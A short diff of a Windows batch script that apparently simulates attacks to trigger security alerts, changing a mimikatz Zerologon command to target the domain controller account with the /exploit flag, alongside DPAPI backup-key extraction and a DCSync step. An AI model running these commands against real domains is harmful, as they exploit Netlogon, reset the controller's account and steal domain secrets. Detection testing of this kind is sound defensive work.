@@ -84,7 +84,7 @@ mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:DC1.corp.contoso.co
 TIMEOUT /T 120
 
 rem **Suspected Netlogon privilege elevation attempt (PUT YOUR DC AND DOMAIN HERE)
-mimikatz.exe "privilege::debug" "lsadump::zerologon /target:DC1.corp.contoso.com /account:admin$"  "exit"
+mimikatz.exe "privilege::debug" "lsadump::zerologon /target:DC1.corp.contoso.com /account:dc1$ /exploit"  "exit"
 TIMEOUT /T 120
 
 rem **Suspected DCSync attack (replication of directory services) (PUT YOUR DOMAIN HERE)
